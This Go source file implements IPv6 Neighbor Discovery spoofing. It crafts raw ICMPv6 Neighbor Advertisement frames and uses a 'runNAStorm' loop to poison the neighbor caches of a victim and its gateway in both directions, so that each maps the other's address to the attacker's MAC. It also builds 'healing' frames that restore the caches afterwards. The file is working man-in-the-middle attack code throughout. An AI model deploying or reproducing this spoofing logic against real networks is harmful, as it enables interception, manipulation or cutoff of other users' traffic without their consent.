package adapters

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

// Shared IPv6 NDP spoof/heal frame logic. Transports (AF_PACKET on Linux,
// Npcap on Windows) only move these bytes; the poisoning semantics mirror
// ARP: victim learns gateway-IP at our MAC, gateway learns victim-IP at our
// MAC, and release sends true-owner Neighbor Advertisements.

// naVictimInterval paces spoofed NAs (NDP is less chatty than ARP).
const naVictimInterval = time.Second

// buildNAFrame constructs an Ethernet + IPv6 + ICMPv6 Neighbor Advertisement.
// The advertisement claims claimedIP is at claimedMAC (target-ll option),
// sent to ethDst/dstIP. Hop limit is 255 as NDP requires.
func buildNAFrame(ethSrc, ethDst net.HardwareAddr, srcIP, dstIP, claimedIP net.IP, claimedMAC net.HardwareAddr) ([]byte, error) {
	if len(ethSrc) != 6 || len(ethDst) != 6 || len(claimedMAC) != 6 {
		return nil, fmt.Errorf("all MAC addresses must be 6 bytes")
	}
	sIP, dIP, cIP := srcIP.To16(), dstIP.To16(), claimedIP.To16()
	if sIP == nil || dIP == nil || cIP == nil ||
		srcIP.To4() != nil || dstIP.To4() != nil || claimedIP.To4() != nil {
		return nil, fmt.Errorf("IPv6 addresses required")
	}
	frame := make([]byte, 14+40+24+8)
	copy(frame[0:6], ethDst)
	copy(frame[6:12], ethSrc)
	binary.BigEndian.PutUint16(frame[12:14], 0x86DD) // EtherType IPv6

	ip6 := frame[14:54]
	ip6[0] = 0x60 // version 6
	binary.BigEndian.PutUint16(ip6[4:6], 32)
	ip6[6] = 58 // next header: ICMPv6
	ip6[7] = 255
	copy(ip6[8:24], sIP)
	copy(ip6[24:40], dIP)

	na := frame[54 : 54+32]
	na[0] = 136 // Neighbor Advertisement
	na[1] = 0
	na[4] = 0x20 | 0x40 // Solicited + Override
	copy(na[8:24], cIP)
	na[24] = 2 // target link-layer address option
	na[25] = 1 // length in units of 8 octets
	copy(na[26:32], claimedMAC)

	sum := icmpv6Checksum(sIP, dIP, na)
	binary.BigEndian.PutUint16(na[2:4], sum)
	return frame, nil
}

// icmpv6Checksum computes the RFC 8200 checksum over pseudo-header + payload.
func icmpv6Checksum(src, dst net.IP, payload []byte) uint16 {
	var sum uint32
	// Pseudo-header: src(16) + dst(16) + length(4) + zeros(3) + next(1).
	pseudo := make([]byte, 0, 40)
	pseudo = append(pseudo, src...)
	pseudo = append(pseudo, dst...)
	ln := make([]byte, 4)
	binary.BigEndian.PutUint32(ln, uint32(len(payload)))
	pseudo = append(pseudo, ln...)
	pseudo = append(pseudo, 0, 0, 0, 58)
	data := append(pseudo, payload...)
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

// healingNAFrames builds true-owner Neighbor Advertisements restoring v6 caches.
func healingNAFrames(gwIPs []net.IP, gwMAC net.HardwareAddr, victimIPs []net.IP, victimMAC net.HardwareAddr) []healPacket {
	var out []healPacket
	for _, vip := range victimIPs {
		if f, err := buildNAFrame(victimMAC, gwMAC, vip, gwPickSrc(gwIPs), vip, victimMAC); err == nil {
			out = append(out, healPacket{dst: gwMAC, frame: f})
		}
	}
	for _, gip := range gwIPs {
		if f, err := buildNAFrame(gwMAC, victimMAC, gip, gwPickSrc(victimIPs), gip, gwMAC); err == nil {
			out = append(out, healPacket{dst: victimMAC, frame: f})
		}
	}
	return out
}

// gwPickSrc picks a source address for NA frames (first available).
func gwPickSrc(ips []net.IP) net.IP {
	if len(ips) > 0 {
		return ips[0]
	}
	return net.ParseIP("fe80::1")
}

// runNAStorm poisons NDP in both directions until stop closes.
// victimIPs: victim addresses to claim at the gateway; gwIPs: gateway
// addresses to claim at the victim. True-owner variants heal on release.
func runNAStorm(stop <-chan struct{}, send func(dst net.HardwareAddr, frame []byte), hostMAC, victimMAC, gwMAC net.HardwareAddr, victimIPs, gwIPs []net.IP, poison bool) {
	claimedVictim, claimedGW := victimMAC, gwMAC
	if poison {
		claimedVictim, claimedGW = hostMAC, hostMAC
	}
	ticker := time.NewTicker(naVictimInterval)
	defer ticker.Stop()
	sendAll := func() {
		for _, vip := range victimIPs {
			// Tell gateway: victim IP is at claimedVictim MAC.
			if f, err := buildNAFrame(hostMAC, gwMAC, vip, gwPickSrc(gwIPs), vip, claimedVictim); err == nil {
				send(gwMAC, f)
			}
		}
		for _, gip := range gwIPs {
			// Tell victim: gateway IP is at claimedGW MAC.
			if f, err := buildNAFrame(hostMAC, victimMAC, gip, gwPickSrc(victimIPs), gip, claimedGW); err == nil {
				send(victimMAC, f)
			}
		}
	}
	sendAll()
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			sendAll()
		}
	}
}

// linkLocalsFirst orders neighbor addresses with link-locals first (most
// NDP cache entries — and the ones that matter for gateway reachability).
func linkLocalsFirst(addrs []net.IP) []net.IP {
	ll, rest := addrs[:0:0], []net.IP(nil)
	for _, ip := range addrs {
		if ip.IsLinkLocalUnicast() {
			ll = append(ll, ip)
		} else {
			rest = append(rest, ip)
		}
	}
	return append(ll, rest...)
}
